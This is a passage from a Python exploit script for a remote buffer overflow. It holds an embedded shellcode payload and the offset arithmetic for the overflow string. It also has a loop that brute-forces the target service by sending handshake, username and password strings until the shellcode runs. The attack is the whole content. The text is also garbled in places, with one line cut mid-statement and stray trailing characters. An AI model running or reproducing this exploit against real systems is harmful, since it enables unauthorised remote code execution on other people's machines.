    shellcode += "x39xc0xb4xe5x57x79x6fx9exebx0exa9x59"
    shellcode += "x0cx25x84xbexa1x95xb4x13x16x72x01xc2"
    shellcode += "xe1x25x8ax3fx42x79x1fxc3x37x2exb7x78"
    shellcode += "xb6xd0x47x97x86xd1x47x67xd9x84x3fx54"
    shellcode += "x6ex11x95xaax3ax37x6fxa8xf7xbexf8x1d"
    shellcode += "x4cx16x73x50x25xc2x0cxa6x91xc1xb0x8b"
    shellcode += "x53x69x76x22xd9x46x0ax1axbcxeax87xf9"
    shellcode += "x09xb2x10xcfx14x3cxd0x56xb3xc8xbaxe0"
    shellcode += "x69x5ax3axa2xffxf0xf2x73x92x4bx79x10"
    shellcode += "x02x3fx4fxdcx8fxdbxe7x4fx6dx1dxa9x1d"
    shellcode += "x42x0cx70x80xccxe9xe5x0ax55x80x8axc2"
    shellcode += "x3dx2ax2fxa5xe2xf1xfex7dx2ax86x6bx08"
    shellcode += "x27x33x2axbbxbfxf9xd9x7ax7dx87x4fx10"
    shellcode += "xedx0dx1bxadx88xc6xb8x50x07x6ax74xf1"
    shellcode += "xd3x2dxd9x84x4exc0x8ex25x23x76x60xc9"
    shellcode += "xb4xd9xf5x64x0ex8exa6x22x05x39x3fx98"
    shellcode += "x96x8excax4fx79x54x64x26x33x3dxe7xaa"
    shellcode += "xa2xb1x90x59x4bx74x1axcexf9x0axc6xd8"
    shellcode += "xccx99x49x75x47x33x0ex1cxd5xf9xdexad"
    shellcode += "xa3x8cx1ex02x3bx38x96x3dx7dx39x7dxc8"
    shellcode += "x47x95x16xcbx75xfax63x98x2axa9x3cx4c"
    shellcode += "x9ax25x28x27x0cx8dx51x1dxc6x9bxa7xc1"
    shellcode += "x8exdbx8bxfdx4ex55x0bx97x4ax35xa6x77"
    shellcode += "x04xddx43xcex36x9bx53x1bx15xf7xf8xf7"
    shellcode += "xcfx9fxd3xf1xf7x24xd3x2bx82x1bx5exdc"
    shellcode += "xc3xeex78x34x90x10x7bxc5x4cx51x13xc5"
    shellcode += "x80x51xe3xadxa0x51xa3x2dxf3x39x7bx8a"
    shellcode += "xa0x5cx84x07xd5xccx28x21x3exa5xa6x31"
    shellcode += "xe0x4ax37x61xb6x22x25x13xbfx51xb6xce"
    shellcode += "x3ax55x3dx3excfx51xbfx03x4ax9dxcax66"
    shellcode += "x0cxddx6ax81xdbx1ex6bxaex12xd8xa6x7f"
    shellcode += "x65x2cxffx51xbdx60xd1x9fx8fxb3x2dx5b"
    shellcode += "x11xbdx1fx71x87xc2x0cx7ax82xa9xb2x47"
    ################################
    ###     BUFFER OVERFLOW      ###
    ###   STRING CONSTRUCTION    ###
    ################################
    # Calculate address values based on the OS offset
    pointerLocationAddress    = OSdictionary['Offset'] + 0x00005ad8
    pointerForECXplus8Address = OSdictionary['Offset'] + 0x00005ad4
    breakPointAddress         = OSdictionary['Offset'] + 0x000065af - 0x00010000
    # jump over the next 38 bytes (to the begining of the shellcode)
    jumpToShellcode    = "xebx26x90x90"
    # pointerLocationAddress - the memory address location of the "pointerForECXplus8" variable
    pointerLocation    = struct.pack(' 0])))
        printLine ("I", 3, "Max attempt   : " + str(max(OSdictionary['TestAttempts'])))
        printLine ("I", 3, "Avg attempt   : " + str(sum(OSdictionary['TestAttempts']) / len(OSdictionary['TestAttempts'])))
        printLine ("I", 3, "Median attempt: " + str(calculateMedian(OSdictionary['TestAttempts'])))
    # connect to the server and return the socket
    def connectToServer(server, port):
        # create socket
        targetSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            targetSocket.connect((server, port))
        except socket.error as msg:
            if "[Errno 111] Connection refused" in str(msg):
                return None
        # return the opened socket
        return targetSocket
    # send the data to the server and return the response
    def sendDataToServer(destSocket, dataToSend):
        destSocket.send(dataToSend)
        try:
            receivedData = destSocket.recv(1024)
        except socket.error as msg:
            if "[Errno 104] Connection reset by peer" in str(msg):
                return None
        return receivedData
    # run the exploit; exits when finished or interrupted
    def runExploit():
        printLine ("I", 0, "Starting exploit...")
        attemptCounter = 0
        # brute force the service until the shellcode is successfully executed
        while True:
            # connect to the target server
            openSocket = connectToServer(targetServer, targetPort)
            attemptCounter += 1
            sleepTimer = 0
            printLine ("I", 1, "Attempt no. " + str(attemptCounter))
            printLine ("I", 2, "Sending initialisation sequence...")
            # send the data; check outcome
            while True:
                receivedData = sendDataToServer(openSocket, initialisationSequence)
                # check if server responded properly, if yes exit the loop
                if receivedData:
                    if "Please press ..." in receivedData:
                        break
                # exit if the service is unavailable
                if attemptCounter == 1:
                    printLine ("E", 3, "Service unavailable")
                    printLine ("I", 4, "Exiting...")
                    exit(1)
                # check if shellcode executed (based on a timer)
                if sleepTimer > shellcodeExecutionTimeout:
                    print ""
                    printLine ("S", 4, "Shellcode executed after " + str(attemptCounter - 1) + " attempts")
                    printLine ("I", 5, "Exiting...")
                    exit(1)
                # print waiting ticks
                sys.stdout.write('r')
                sys.stdout.write("             33[1;33m[!]33[1;m Connection reset - reinitialising%s" % ('.' * sleepTimer))
                sys.stdout.flush()
                # sleep one second and reconnect
                time.sleep(1)
                sleepTimer += 1
                openSocket.close()
                openSocket = connectToServer(targetServer, targetPort)
            if sleepTimer > 0:
                print ""
            printLine ("I", 2, "Sending handshake sequence...")
            openSocket.send(handshakeSequence)
            time.sleep(3)
            data = openSocket.recv(1024)
            printLine ("I", 2, "Sending username...")
            openSocket.send(usernameString)
            time.sleep(3)
            printLine ("I", 2, "Sending password...")
            openSocket.send(passwordString)
            openSocket.close()
            time.sleep(3)
    # main function
    if __name__ == "__main__":
        printBanner()
        try:
            runExploit()
        except KeyboardInterrupt:
            print ""
            sys.exit()
    # End of file
截图: